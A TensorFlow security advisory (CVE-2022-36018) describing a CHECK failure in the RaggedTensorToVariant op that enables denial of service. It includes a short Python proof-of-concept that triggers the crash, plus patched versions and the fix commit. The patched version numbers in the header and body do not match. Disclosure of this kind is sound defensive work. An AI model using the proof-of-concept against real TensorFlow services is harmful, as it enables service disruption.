# `CHECK` fail in `RaggedTensorToVariant`

Low

[pak-laura](/pak-laura)
published
GHSA-m6cv-4fmf-66xf
Sep 15, 2022

## Package

pip

tensorflow, tensorflow-cpu, tensorflow-gpu
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

< 2.10.0

## Patched versions

2.7.4, 2.8.3, 2.9.2, 2.10.0

## Description

### Impact

If `RaggedTensorToVariant` is given a `rt_nested_splits` list that contains tensors of ranks other than one, it results in a `CHECK` fail that can be used to trigger a denial of service attack.

```
import tensorflow as tf

batched_input = True
rt_nested_splits = tf.constant([0,32,64], shape=[3], dtype=tf.int64)
rt_dense_values = tf.constant([0,32,64], shape=[3], dtype=tf.int64)
tf.raw_ops.RaggedTensorToVariant(rt_nested_splits=rt_nested_splits, rt_dense_values=rt_dense_values, batched_input=batched_input)
```
### Patches

We have patched the issue in GitHub commit [88f93dfe691563baa4ae1e80ccde2d5c7a143821](https://github.com/tensorflow/tensorflow/commit/88f93dfe691563baa4ae1e80ccde2d5c7a143821).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.

### For more information

Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution

This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.

### Severity

Low

### CVE ID

CVE-2022-36018

### Weaknesses

No CWEs
